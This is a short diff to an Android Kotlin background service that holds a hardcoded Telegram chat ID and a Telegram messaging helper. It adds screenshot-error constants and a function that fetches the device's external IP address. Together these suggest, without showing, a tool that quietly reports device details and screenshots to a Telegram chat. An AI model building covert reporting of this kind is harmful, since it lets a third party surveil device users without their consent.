@@ -34,6 +34,21 @@ class MyService : Service() {
         const val CHAT_ID = "8820979221"
         private val client = OkHttpClient()
 
+
+
+const val ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR = "Screenshot error"
+const val ERROR_TAKE_SCREENSHOT_INTERNAL_TIME = "Screenshot timeout"
+
+fun getExternalIP(): String {
+    return try {
+        java.net.URL("https://api.ipify.org").readText()
+    } catch (e: Exception) {
+        "unknown"
+    }
+}
+
+        
+
         suspend fun sendStaticTelegramMessage(text: String) {
             try {
                 val form = FormBody.Builder()
